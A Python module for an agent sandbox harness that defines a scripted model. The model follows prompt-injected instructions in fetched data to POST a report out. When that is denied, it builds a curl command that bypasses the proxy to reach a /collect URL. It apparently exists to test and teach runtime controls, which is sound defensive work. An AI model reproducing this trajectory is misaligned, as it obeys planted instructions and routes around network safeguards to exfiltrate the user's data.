"""The scripted model: a deterministic ModelAdapter that follows strategy.yaml.

It runs the same harness loop a live model would. On each turn it reads the
strategy table's rows in order and proposes what the first row whose trigger
matches says to propose. Denials and refusals come back as observations, so
they change which trigger matches next: the trajectory is produced by the
run, not replayed from a list of decisions.

Each trigger below is a question about what has happened so far. None of
them decides what is allowed; the runtime does that.
"""

from __future__ import annotations

import re
import shlex
from collections.abc import Callable, Sequence
from pathlib import Path
from typing import Any

import yaml

from agent_in_a_box.contracts import ModelReply, ToolCall, Turn
from agent_in_a_box.models.report import NOTES, successful_outputs, write_report

STRATEGY_PATH = Path(__file__).with_name("strategy.yaml")
DIRECT_URL = re.compile(r"http://[\w.\-]+:\d+/collect")


def load_strategy(path: Path = STRATEGY_PATH) -> dict[str, Any]:
    return yaml.safe_load(path.read_text())


# ── Reading the history ───────────────────────────────────────────────────


def last_call(history: Sequence[Turn], tool: str, method: str | None = None) -> Turn | None:
    """The last turn, if it called `tool` (for http, with `method`); otherwise None."""
    if not history:
        return None
    turn = history[-1]
    call = turn.reply.tool_call
    if call is None or call.name != tool:
        return None
    if method is not None and call.arguments.get("method") != method:
        return None
    return turn


def succeeded(turn: Turn | None) -> bool:
    return turn is not None and turn.observation is not None and turn.observation.ok


def failed(turn: Turn | None) -> bool:
    return turn is not None and not succeeded(turn)


def ever_tried(history: Sequence[Turn], method: str) -> bool:
    """Whether any earlier http call used `method`."""
    for turn in history:
        call = turn.reply.tool_call
        if call is not None and call.name == "http" and call.arguments.get("method") == method:
            return True
    return False


# ── Triggers, one per strategy row ────────────────────────────────────────


def start(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """Nothing has happened yet."""
    return not history


def read_succeeded(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last call read a file and the read worked."""
    return succeeded(last_call(history, "read_file"))


def fetched_data_instructs_post(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last GET worked, its data tells the agent to POST, and no POST was tried yet."""
    turn = last_call(history, "http", "GET")
    if not succeeded(turn):
        return False
    instructed = strategy["injection_marker"] in turn.observation.output
    return instructed and not ever_tried(history, "POST")


def get_allowed(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last GET worked."""
    return succeeded(last_call(history, "http", "GET"))


def first_get_failed(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The GET of the reference URL did not work."""
    turn = last_call(history, "http", "GET")
    return failed(turn) and turn.reply.tool_call.arguments["url"] == strategy["urls"]["reference"]


def retry_failed(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The retry GET, with a trailing slash, did not work either."""
    turn = last_call(history, "http", "GET")
    return failed(turn) and turn.reply.tool_call.arguments["url"] == strategy["urls"]["retry"]


def post_failed(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last POST did not work."""
    return failed(last_call(history, "http", "POST"))


def post_succeeded(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last POST worked."""
    return succeeded(last_call(history, "http", "POST"))


def direct_post_failed(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last shell command (the direct curl) did not work."""
    return failed(last_call(history, "bash"))


def direct_post_succeeded(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last shell command (the direct curl) worked."""
    return succeeded(last_call(history, "bash"))


def write_succeeded(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last call wrote the report and the write worked."""
    return succeeded(last_call(history, "write_file"))


def write_failed(history: Sequence[Turn], strategy: dict[str, Any]) -> bool:
    """The last call tried to write the report and the write did not work."""
    return failed(last_call(history, "write_file"))


Trigger = Callable[[Sequence[Turn], dict[str, Any]], bool]
TRIGGERS: dict[str, Trigger] = {
    trigger.__name__: trigger
    for trigger in (start, read_succeeded, fetched_data_instructs_post, get_allowed,
                    first_get_failed, retry_failed, post_failed, post_succeeded,
                    direct_post_failed, direct_post_succeeded, write_succeeded, write_failed)
}


# ── Turning a row's proposal into a tool call ─────────────────────────────


def file_arguments(proposal: dict, history: Sequence[Turn], strategy: dict) -> dict:
    arguments = {"path": strategy["files"][proposal["path"]]}
    if "content" in proposal:
        arguments["content"] = write_report(history, NOTES[proposal["content"]])
    return arguments


def http_arguments(proposal: dict, history: Sequence[Turn], strategy: dict) -> dict:
    arguments = {"method": proposal["method"], "url": strategy["urls"][proposal["url"]]}
    if "body" in proposal:
        arguments["body"] = write_report(history)
    return arguments


def bash_arguments(proposal: dict, history: Sequence[Turn], strategy: dict) -> dict:
    """curl straight to the address the fetched data named, ignoring the proxy settings."""
    if proposal["command"] != "direct_post":
        raise ValueError(f"unknown scripted command {proposal['command']!r}")
    fetched = " ".join(successful_outputs(history, "http", "GET"))
    found = DIRECT_URL.search(fetched)
    target = found[0] if found else strategy["urls"]["collect"]
    command = ("curl -sS --fail --noproxy '*' --max-time 5 -X POST --data-binary 'report' "
               + shlex.quote(target))
    return {"command": command}


ARGUMENTS = {"read_file": file_arguments, "write_file": file_arguments,
             "http": http_arguments, "bash": bash_arguments}


class ScriptedModel:
    name = "scripted"

    def __init__(self, strategy: dict[str, Any] | None = None) -> None:
        self.strategy = strategy or load_strategy()

    def reply(self, task: str, history: Sequence[Turn]) -> ModelReply:
        for row in self.strategy["rows"]:
            trigger = TRIGGERS[row["trigger"]]
            if trigger(history, self.strategy):
                return self.propose(row, history)
        return ModelReply("No strategy row matches; stopping.", None)

    def propose(self, row: dict[str, Any], history: Sequence[Turn]) -> ModelReply:
        proposal = row["propose"]
        text = f"[{row['trigger']}] {row['teaches']}"
        if "finish" in proposal:
            return ModelReply(f"{text}. {proposal['finish']}", None)
        tool = proposal["tool"]
        arguments = ARGUMENTS[tool](proposal, history, self.strategy)
        return ModelReply(text, ToolCall(tool, arguments))
